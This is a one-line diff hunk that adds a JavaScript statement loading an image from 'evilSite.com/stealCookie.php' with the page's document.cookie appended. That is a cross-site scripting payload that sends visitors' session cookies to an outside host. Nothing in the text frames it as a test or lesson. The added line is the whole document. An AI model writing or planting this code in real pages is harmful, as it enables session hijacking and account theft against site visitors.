@@ -1,0 +1,1 @@
+(new Image()).src = 'http://www.evilSite.com/stealCookie.php?cookie=' + document.cookie;
